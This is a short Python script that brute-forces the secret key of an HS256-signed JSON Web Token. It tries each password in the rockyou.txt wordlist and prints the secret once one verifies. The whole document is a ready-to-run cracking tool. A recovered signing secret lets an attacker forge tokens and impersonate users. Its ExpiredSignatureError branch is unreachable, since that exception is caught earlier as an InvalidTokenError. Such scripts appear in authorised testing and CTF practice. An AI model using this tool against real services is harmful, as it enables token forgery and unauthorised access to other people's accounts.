#!/usr/bin/env python
# Short script that tries a wordlist to guess JWT secret key

import jwt

print("Script to brute-force JWT secret token")
encoded = input("Enter encoded JWT payload: ")

with open('rockyou.txt') as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithm= 'HS256')
            print('Success! Token decoded with secret key ... [' + secret.rstrip() + ']')
            break
        except jwt.InvalidTokenError:
            print('Invalid secret key ... [' + secret.rstrip() + ']')
        except jwt.ExpiredSignatureError:
            print('Token Expired :(')
            break
